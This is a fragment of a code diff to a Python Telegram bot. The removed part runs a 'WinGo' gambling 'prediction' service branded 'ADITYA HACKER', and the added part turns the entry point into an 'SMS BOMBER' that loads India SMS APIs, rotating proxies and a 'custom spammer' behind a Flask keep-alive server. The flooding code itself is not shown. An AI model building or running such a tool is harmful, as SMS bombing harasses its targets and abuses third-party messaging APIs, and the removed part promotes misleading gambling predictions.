-╚══════════════════════════════╝
-
-👇 *Select an option from the menu below:*
-"""
-    bot.send_message(msg.chat.id, welcome, reply_markup=main_control_menu(), disable_web_page_preview=True)
-
-@bot.message_handler(func=lambda m: True)
-def message_router(msg):
-    text = (msg.text or "").strip()
-    cid = msg.chat.id
-
-    if text == "🚀 Start Prediction":
-        if active_dict.get(cid):
-            bot.send_message(cid, "⚠️ *Prediction is already running LIVE!*", reply_markup=main_control_menu())
-            return
-
-        active_dict[cid] = True
-        bot.send_message(
-            cid,
-            "🟢 *LIVE PREDICTION STARTED!*\n\n"
-            "⚡ Fetching real-time WinGo 1M period...\n"
-            "🎯 Format: `BIG 0` / `SMALL 7`",
-            reply_markup=main_control_menu()
-        )
-        threading.Thread(target=prediction_worker, args=(cid,), daemon=True).start()
-
-    elif text == "🎧 Customer Service":
-        markup = types.InlineKeyboardMarkup()
-        markup.add(types.InlineKeyboardButton("📢 Join Official Channel / Support", url=CHANNEL_LINK))
-        bot.send_message(
-            cid,
-            "🎧 *CUSTOMER SERVICE & VIP SUPPORT*\n"
-            "━━━━━━━━━━━━━━━━━━━━━━━━\n"
-            "👇 नीचे दिए गए बटन पर क्लिक करके सीधे हमारे ऑफिशियल चैनल पर जुड़ें:",
-            reply_markup=markup,
-            disable_web_page_preview=True
-        )
-
-    elif text == "🛑 Stop Prediction":
-        active_dict[cid] = False
-        last_sent_period.pop(cid, None)
-        bot.send_message(
-            cid,
-            "🛑 *Prediction Stopped!*\n\n"
-            "▶️ दोबारा शुरू करने के लिए *🚀 Start Prediction* दबाएं।",
-            reply_markup=main_control_menu()
-        )
-
-    elif text == "📜 All History":
-        bot.send_message(cid, build_history_text(), reply_markup=main_control_menu(), disable_web_page_preview=True)
-
-@bot.callback_query_handler(func=lambda call: True)
-def callback_handler(call):
-    if call.data == "show_history":
-        bot.answer_callback_query(call.id)
-        bot.send_message(call.message.chat.id, build_history_text(), disable_web_page_preview=True)
-
-# ===============================
-# 🚀 24/7 BACKGROUND UPDATER THREAD
-# ===============================
-def background_updater():
-    while True:
-        try:
-            update_global_prediction()
-        except Exception as e:
-            print(f"[Background Updater Error] {e}")
-        time.sleep(2.5)
-
-# ===============================
-# 🚀 MAIN RUNNABLE (24/7 WITH AUTO-RESTART)
-# ===============================
 if __name__ == "__main__":
-    print("👑 ADITYA HACKER 1.3 Bot + Flask Server Starting 24/7...")
-    threading.Thread(target=run_flask, daemon=True).start()
-    threading.Thread(target=background_updater, daemon=True).start()
+    print(f"""
+╔══════════════════════════════════════════════════╗
+║     SURAJ BHAI SMS BOMBER — 24/7 FLASK EDITION   ║
+║     {datetime.now().strftime('%Y-%m-%d  %H:%M:%S')}                ║
+╚══════════════════════════════════════════════════╝
 
-    while True:
-        try:
-            bot.infinity_polling(timeout=60, long_polling_timeout=60)
-        except Exception as e:
-            print(f"[Polling Error - Restarting in 3s] {e}")
-            time.sleep(3)
+✅ LOADED SUCCESSFULLY:
+ ├ 🇮🇳 India SMS APIs : {len(INDIA_SMS_APIS)}
+ ├ 🌐 Proxy Rotation : {len(PROXY_LIST)} proxies
+ ├ 🛑 Stop Feature   : Enabled
+ ├ 💬 Custom Spammer : Enabled
+ ├ 🌐 Flask Web Server: Running for 24/7 Uptime
+ └ ⚠️ Warning Notice : Included
+
+🤖 BOT RUNNING...
+""")
+
+    # Start Flask web server in a separate thread
+    flask_thread = threading.Thread(target=run_flask, daemon=True)
+    flask_thread.start()
+
+    # Start Telegram Bot Polling
+    bot.infinity_polling(timeout=60, long_polling_timeout=60)
